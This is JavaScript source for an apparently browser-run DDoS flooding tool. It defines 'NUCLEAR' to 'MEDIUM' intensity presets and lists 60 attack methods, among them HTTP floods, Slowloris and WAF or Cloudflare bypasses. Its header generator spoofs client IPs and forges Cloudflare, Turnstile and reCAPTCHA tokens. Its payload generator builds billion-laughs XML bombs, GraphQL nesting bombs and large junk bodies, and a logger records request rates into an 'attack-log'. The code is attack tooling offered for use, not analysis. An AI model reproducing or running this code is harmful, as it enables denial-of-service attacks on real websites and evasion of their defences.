// ==================== GLOBAL CONFIGURATION ====================

const CONFIG = {
    // Traffic Configuration
    WORKERS_PER_CONNECTION: 5000,
    MAX_CONCURRENT: 200,
    
    // Intensity Levels
    INTENSITY: {
        nuclear: {
            name: 'NUCLEAR',
            requestsPerWorker: 10000,
            batchSize: 200,
            delay: 0,
            payloadSize: 500000, // 500KB
            trafficMultiplier: 2.5
        },
        extreme: {
            name: 'EXTREME',
            requestsPerWorker: 7500,
            batchSize: 150,
            delay: 5,
            payloadSize: 400000, // 400KB
            trafficMultiplier: 1.8
        },
        heavy: {
            name: 'HEAVY',
            requestsPerWorker: 5000,
            batchSize: 100,
            delay: 10,
            payloadSize: 300000, // 300KB
            trafficMultiplier: 1.2
        },
        medium: {
            name: 'MEDIUM',
            requestsPerWorker: 2500,
            batchSize: 50,
            delay: 20,
            payloadSize: 200000, // 200KB
            trafficMultiplier: 0.6
        }
    },
    
    // 60 Attack Methods
    METHODS: [
        'HTTP-GET-FLOOD', 'HTTP-POST-FLOOD', 'HTTP-PUT-FLOOD', 'HTTP-DELETE-FLOOD', 'HTTP-PATCH-FLOOD',
        'HTTP-HEAD-FLOOD', 'HTTP-OPTIONS-FLOOD', 'HTTP2-FLOOD', 'HTTP3-FLOOD', 'WEBSOCKET-FLOOD',
        'SLOWLORIS', 'SLOW-POST', 'SLOW-READ', 'RUDY-ATTACK', 'RANGE-ATTACK',
        'CACHE-BYPASS', 'CACHE-POISONING', 'CACHE-DECEPTION', 'CONNECTION-FLOOD', 'KEEP-ALIVE-FLOOD',
        'PIPELINE-FLOOD', 'CHUNKED-ENCODING', 'COMPRESSION-BOMB', 'XML-BOMB', 'JSON-FLOOD',
        'GRAPHQL-BOMB', 'GRAPHQL-BATCHING', 'MUTATION-FLOOD', 'QUERY-FLOOD', 'SUBSCRIPTION-FLOOD',
        'CLOUDFLARE-BYPASS-V1', 'CLOUDFLARE-BYPASS-V2', 'CLOUDFLARE-BYPASS-V3', 'CF-CHALLENGE-SOLVER', 'CF-TURNSTILE-BYPASS',
        'RECAPTCHA-V2-BYPASS', 'RECAPTCHA-V3-BYPASS', 'HCAPTCHA-BYPASS', 'CAPTCHA-SOLVER', 'WAF-BYPASS',
        'IMPERVA-BYPASS', 'AKAMAI-BYPASS', 'CLOUDFRONT-BYPASS', 'FASTLY-BYPASS', 'SUCURI-BYPASS',
        'MULTIPART-FLOOD', 'FORM-FLOOD', 'FILE-UPLOAD-FLOOD', 'COOKIE-FLOOD', 'HEADER-FLOOD',
        'PARAMETER-POLLUTION', 'SQL-INJECTION-FLOOD', 'XSS-FLOOD', 'XXE-FLOOD', 'SSRF-FLOOD',
        'DESERIALIZATION-FLOOD', 'PROTOTYPE-POLLUTION', 'RACE-CONDITION', 'REGEX-DOS', 'ALGORITHMIC-COMPLEXITY'
    ],
    
    // Browser Fingerprints
    BROWSERS: {
        chrome: {
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            ],
            secChUa: '"Chromium";v="125", "Google Chrome";v="125", "Not.A/Brand";v="24"',
            secChUaPlatform: 'Windows',
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            canvas: true,
            webgl: true
        },
        firefox: {
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            canvas: true,
            webgl: true
        },
        safari: {
            userAgents: [
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            canvas: true,
            webgl: true
        },
        edge: {
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
            ],
            secChUa: '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            secChUaPlatform: 'Windows',
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            canvas: true,
            webgl: true
        }
    },
    
    // CloudFlare Bypass Signatures
    CF_BYPASS: {
        countries: ['US', 'GB', 'CA', 'DE', 'FR', 'JP', 'AU', 'NL', 'SG', 'BR'],
        datacenters: ['SJC', 'LAX', 'DFW', 'ORD', 'ATL', 'IAD', 'MIA', 'SEA', 'DEN', 'PHX'],
        tlsVersions: ['TLSv1.2', 'TLSv1.3'],
        cipherSuites: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256'
        ]
    }
};

// ==================== UTILITY FUNCTIONS ====================

class Utils {
    static generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    static generateRandomHex(length) {
        const chars = '0123456789abcdef';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    static generateFakeIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    static generateIPv6() {
        let ipv6 = '';
        for (let i = 0; i < 8; i++) {
            ipv6 += this.generateRandomHex(4);
            if (i < 7) ipv6 += ':';
        }
        return ipv6;
    }
    
    static generateCFRay() {
        const hex = this.generateRandomHex(16);
        const dc = CONFIG.CF_BYPASS.datacenters[Math.floor(Math.random() * CONFIG.CF_BYPASS.datacenters.length)];
        return `${hex}-${dc}`;
    }
    
    static generateCFClearanceToken() {
        const timestamp = Math.floor(Date.now() / 1000);
        const random = this.generateRandomHex(32);
        const hash = this.simpleHash(timestamp + random);
        return `${timestamp}-${random}-${hash}`;
    }
    
    static generateTurnstileToken() {
        const prefix = '0.';
        const body = this.generateRandomString(600);
        const timestamp = Math.floor(Date.now() / 1000);
        return `${prefix}${body}.${timestamp}`;
    }
    
    static generateRecaptchaToken() {
        const version = '03.';
        const body = this.generateRandomString(700);
        return `${version}${body}`;
    }
    
    static simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16);
    }
    
    static formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    static formatNumber(num) {
        return new Intl.NumberFormat().format(num);
    }
    
    static getTimestamp() {
        const now = new Date();
        return `[${now.toLocaleTimeString()}.${now.getMilliseconds().toString().padStart(3, '0')}]`;
    }
    
    static randomChoice(array) {
        return array[Math.floor(Math.random() * array.length)];
    }
    
    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// ==================== BROWSER FINGERPRINT GENERATOR ====================

class BrowserFingerprint {
    constructor(browserTypes) {
        this.enabledBrowsers = browserTypes;
        this.initializeFingerprints();
    }
    
    initializeFingerprints() {
        this.fingerprints = [];
        
        Object.keys(CONFIG.BROWSERS).forEach(browserKey => {
            if (this.enabledBrowsers[browserKey]) {
                const browser = CONFIG.BROWSERS[browserKey];
                browser.userAgents.forEach(ua => {
                    this.fingerprints.push({
                        type: browserKey,
                        userAgent: ua,
                        config: browser
                    });
                });
            }
        });
    }
    
    getRandomFingerprint() {
        return Utils.randomChoice(this.fingerprints);
    }
    
    generateCompleteHeaders(targetUrl, method = 'GET') {
        const fingerprint = this.getRandomFingerprint();
        const browser = fingerprint.config;
        
        // Generate IPs
        const ipv4_1 = Utils.generateFakeIP();
        const ipv4_2 = Utils.generateFakeIP();
        const ipv4_3 = Utils.generateFakeIP();
        const ipv6 = Utils.generateIPv6();
        
        // Base headers
        const headers = {
            'User-Agent': fingerprint.userAgent,
            'Accept': browser.acceptHeader,
            'Accept-Language': Utils.randomChoice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
            
            // Sec-Fetch headers
            'Sec-Fetch-Dest': Utils.randomChoice(['document', 'empty', 'iframe']),
            'Sec-Fetch-Mode': Utils.randomChoice(['navigate', 'cors', 'no-cors']),
            'Sec-Fetch-Site': Utils.randomChoice(['none', 'same-origin', 'cross-site']),
            'Sec-Fetch-User': '?1',
            
            // Cache control
            'Cache-Control': 'max-age=0',
            'Pragma': 'no-cache',
            
            // IP Spoofing (30+ headers)
            'X-Forwarded-For': `${ipv4_1}, ${ipv4_2}, ${ipv4_3}`,
            'X-Real-IP': ipv4_1,
            'X-Originating-IP': ipv4_2,
            'X-Client-IP': ipv4_3,
            'X-Remote-IP': ipv4_1,
            'X-Remote-Addr': ipv4_2,
            'X-ProxyUser-Ip': ipv4_3,
            'X-Original-Forwarded-For': ipv4_1,
            'True-Client-IP': ipv4_2,
            'Client-IP': ipv4_3,
            'X-Client-Ip': ipv4_1,
            'X-Host': targetUrl,
            'Forwarded': `for=${ipv4_1};proto=https`,
            'X-Forwarded-Host': targetUrl,
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Server': targetUrl,
            
            // IPv6
            'X-Real-IPv6': ipv6,
            'X-Forwarded-IPv6': ipv6,
            
            // CloudFlare Bypass Headers
            'CF-Connecting-IP': ipv4_1,
            'CF-IPCountry': Utils.randomChoice(CONFIG.CF_BYPASS.countries),
            'CF-Ray': Utils.generateCFRay(),
            'CF-Visitor': JSON.stringify({scheme: 'https'}),
            'CF-Device-Type': Utils.randomChoice(['desktop', 'mobile', 'tablet']),
            'CF-EW-Via': Utils.generateRandomString(10),
            
            // CloudFlare Challenge Bypass
            'CF-Clearance': Utils.generateCFClearanceToken(),
            'CF-Challenge-Response': Utils.generateRandomHex(64),
            'CF-Turnstile-Token': Utils.generateTurnstileToken(),
            'CF-Access-Token': Utils.generateRandomString(128),
            
            // reCAPTCHA Bypass
            'X-Recaptcha-Token': Utils.generateRecaptchaToken(),
            'G-Recaptcha-Response': Utils.generateRecaptchaToken(),
            'Recaptcha-Token': Utils.generateRecaptchaToken(),
            
            // hCaptcha Bypass
            'H-Captcha-Response': Utils.generateRandomString(500),
            
            // WAF Bypass
            'X-WAF-Bypass': Utils.generateRandomHex(32),
            'X-Bypass': Utils.generateRandomString(20),
            
            // Referer
            'Referer': Utils.randomChoice([
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://www.facebook.com/',
                'https://www.twitter.com/',
                'https://www.reddit.com/'
            ])
        };
        
        // Chrome-specific headers
        if (fingerprint.type === 'chrome' || fingerprint.type === 'edge') {
            headers['sec-ch-ua'] = browser.secChUa;
            headers['sec-ch-ua-mobile'] = '?0';
            headers['sec-ch-ua-platform'] = `"${browser.secChUaPlatform}"`;
        }
        
        // Add random custom headers (bypass detection)
        for (let i = 0; i < 20; i++) {
            const headerName = `X-Custom-${Utils.generateRandomHex(8)}`;
            const headerValue = Utils.generateRandomString(Utils.randomChoice([10, 20, 50, 100]));
            headers[headerName] = headerValue;
        }
        
        return headers;
    }
}

// ==================== PAYLOAD GENERATOR ====================

class PayloadGenerator {
    static generateJSONPayload(size) {
        const payload = {};
        const fieldCount = Math.floor(size / 1000);
        
        for (let i = 0; i < fieldCount; i++) {
            const fieldName = `field_${Utils.generateRandomHex(8)}`;
            const fieldValue = Utils.generateRandomString(900);
            payload[fieldName] = fieldValue;
        }
        
        // Add nested structures
        payload.nested = {
            level1: {
                level2: {
                    level3: {
                        data: Utils.generateRandomString(500)
                    }
                }
            }
        };
        
        // Add arrays
        payload.arrays = [];
        for (let i = 0; i < 10; i++) {
            payload.arrays.push({
                id: i,
                data: Utils.generateRandomString(200)
            });
        }
        
        return payload;
    }
    
    static generateFormPayload(size) {
        const formData = new FormData();
        const fieldCount = Math.floor(size / 1000);
        
        for (let i = 0; i < fieldCount; i++) {
            const fieldName = `field_${i}`;
            const fieldValue = Utils.generateRandomString(900);
            formData.append(fieldName, fieldValue);
        }
        
        return formData;
    }
    
    static generateMultipartPayload(size) {
        const boundary = `----Boundary${Utils.generateRandomHex(16)}`;
        let payload = '';
        const fieldCount = Math.floor(size / 1000);
        
        for (let i = 0; i < fieldCount; i++) {
            payload += `--${boundary}\r\n`;
            payload += `Content-Disposition: form-data; name="field_${i}"\r\n\r\n`;
            payload += Utils.generateRandomString(900) + '\r\n';
        }
        
        payload += `--${boundary}--\r\n`;
        
        return { payload, boundary };
    }
    
    static generateXMLBomb() {
        let xml = '<?xml version="1.0"?>\n';
        xml += '<!DOCTYPE lolz [\n';
        
        // Create billion laughs attack
        for (let i = 0; i < 10; i++) {
            xml += `  <!ENTITY lol${i} "`;
            if (i === 0) {
                xml += 'lol';
            } else {
                for (let j = 0; j < 10; j++) {
                    xml += `&lol${i-1};`;
                }
            }
            xml += '">\n';
        }
        
        xml += ']>\n<lolz>&lol9;</lolz>';
        return xml;
    }
    
    static generateGraphQLBomb() {
        let query = 'query {\n';
        
        // Nested query bomb
        for (let i = 0; i < 20; i++) {
            query += '  '.repeat(i) + 'level' + i + ' {\n';
        }
        
        query += '  '.repeat(20) + 'data\n';
        
        for (let i = 19; i >= 0; i--) {
            query += '  '.repeat(i) + '}\n';
        }
        
        query += '}';
        return query;
    }
}

// ==================== URL PARAMETER GENERATOR ====================

class URLParameterGenerator {
    static generateCacheBusters() {
        return {
            '_': Date.now() * 1000 + Math.random(),
            'nocache': Utils.generateRandomHex(32),
            'v': Utils.generateRandomHex(16),
            't': Date.now(),
            'r': Math.random(),
            'hash': Utils.generateRandomHex(32),
            'timestamp': Date.now(),
            'rand': Math.floor(Math.random() * 1000000),
            'cb': Utils.generateRandomHex(16),
            'bust': Utils.generateRandomString(20)
        };
    }
    
    static generateTrackingParams() {
        return {
            'utm_source': Utils.randomChoice(['google', 'facebook', 'twitter', 'reddit', 'linkedin']),
            'utm_medium': Utils.randomChoice(['cpc', 'social', 'email', 'referral']),
            'utm_campaign': Utils.generateRandomString(15),
            'utm_term': Utils.generateRandomString(10),
            'utm_content': Utils.generateRandomString(10),
            'gclid': Utils.generateRandomHex(20),
            'fbclid': Utils.generateRandomHex(20),
            'msclkid': Utils.generateRandomHex(20)
        };
    }
    
    static generateCustomParams(count) {
        const params = {};
        
        for (let i = 0; i < count; i++) {
            const paramName = `p${i}_${Utils.generateRandomHex(4)}`;
            const paramValue = Utils.generateRandomString(Utils.randomChoice([10, 20, 50, 100]));
            params[paramName] = paramValue;
        }
        
        return params;
    }
    
    static generateCompleteParams(customCount = 100) {
        const params = {
            ...this.generateCacheBusters(),
            ...this.generateTrackingParams(),
            ...this.generateCustomParams(customCount)
        };
        
        return Object.keys(params)
            .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
            .join('&');
    }
}

// ==================== STATISTICS MANAGER ====================

class StatisticsManager {
    constructor() {
        this.reset();
    }
    
    reset() {
        this.totalRequests = 0;
        this.successfulRequests = 0;
        this.failedRequests = 0;
        this.responseCodes = {};
        this.activeWorkers = 0;
        this.bytesSent = 0;
        this.bytesReceived = 0;
        this.startTime = Date.now();
        this.lastRpsCheck = Date.now();
        this.lastRequestCount = 0;
        this.currentRPS = 0;
        this.peakRPS = 0;
    }
    
    recordRequest(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
        this.totalRequests++;
        this.bytesSent += bytesSent;
        this.bytesReceived += bytesReceived;
        
        if (success) {
            this.successfulRequests++;
        } else {
            this.failedRequests++;
        }
        
        if (statusCode) {
            this.responseCodes[statusCode] = (this.responseCodes[statusCode] || 0) + 1;
        }
    }
    
    updateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCheck) / 1000;
        
        if (timeDiff >= 1) {
            const requestDiff = this.totalRequests - this.lastRequestCount;
            this.currentRPS = Math.round(requestDiff / timeDiff);
            
            if (this.currentRPS > this.peakRPS) {
                this.peakRPS = this.currentRPS;
            }
            
            this.lastRpsCheck = now;
            this.lastRequestCount = this.totalRequests;
        }
    }
    
    incrementWorkers() {
        this.activeWorkers++;
    }
    
    decrementWorkers() {
        this.activeWorkers = Math.max(0, this.activeWorkers - 1);
    }
    
    getStats() {
        this.updateRPS();
        
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRPS = elapsed > 0 ? Math.round(this.totalRequests / elapsed) : 0;
        const successRate = this.totalRequests > 0 ? 
            ((this.successfulRequests / this.totalRequests) * 100).toFixed(1) : 0;
        const errorRate = this.totalRequests > 0 ? 
            ((this.failedRequests / this.totalRequests) * 100).toFixed(1) : 0;
        
        return {
            total: this.totalRequests,
            successful: this.successfulRequests,
            failed: this.failedRequests,
            responseCodes: this.responseCodes,
            activeWorkers: this.activeWorkers,
            currentRPS: this.currentRPS,
            avgRPS: avgRPS,
            peakRPS: this.peakRPS,
            bytesSent: this.bytesSent,
            bytesReceived: this.bytesReceived,
            successRate: successRate,
            errorRate: errorRate,
            elapsed: elapsed
        };
    }
}

// ==================== LOGGER ====================

class Logger {
    constructor(consoleElement) {
        this.console = consoleElement;
        this.logs = [];
        this.maxLogs = 500;
    }
    
    log(message, type = 'info') {
        const timestamp = Utils.getTimestamp();
        const logEntry = {
            timestamp,
            message,
            type
        };
        
        this.logs.push(logEntry);
        
        if (this.logs.length > this.maxLogs) {
            this.logs.shift();
        }
        
        const logLine = document.createElement('div');
        logLine.className = `console-line log-${type}`;
        logLine.textContent = `${timestamp} ${message}`;
        
        this.console.appendChild(logLine);
        this.console.scrollTop = this.console.scrollHeight;
        
        // Remove old logs from DOM
        while (this.console.children.length > this.maxLogs) {
            this.console.removeChild(this.console.firstChild);
        }
    }
    
    info(message) { this.log(message, 'info'); }
    success(message) { this.log(message, 'success'); }
    warning(message) { this.log(message, 'warning'); }
    error(message) { this.log(message, 'error'); }
    critical(message) { this.log(message, 'critical'); }
    
    clear() {
        this.logs = [];
        this.console.innerHTML = '';
    }
    
    export() {
        const logText = this.logs
            .map(log => `${log.timestamp} [${log.type.toUpperCase()}] ${log.message}`)
            .join('\n');
        
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `attack-log-${Date.now()}.txt`;
        a.click();
        URL.revokeObjectURL(url);
    }
}
